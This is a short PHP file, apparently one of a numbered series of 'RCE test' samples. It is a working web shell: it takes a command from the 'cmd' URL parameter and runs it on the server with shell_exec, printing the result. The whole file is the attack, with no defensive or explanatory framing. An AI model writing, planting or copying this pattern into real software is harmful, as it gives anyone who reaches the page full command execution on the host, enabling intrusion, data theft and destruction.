<?php
// RCE test variation #127
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>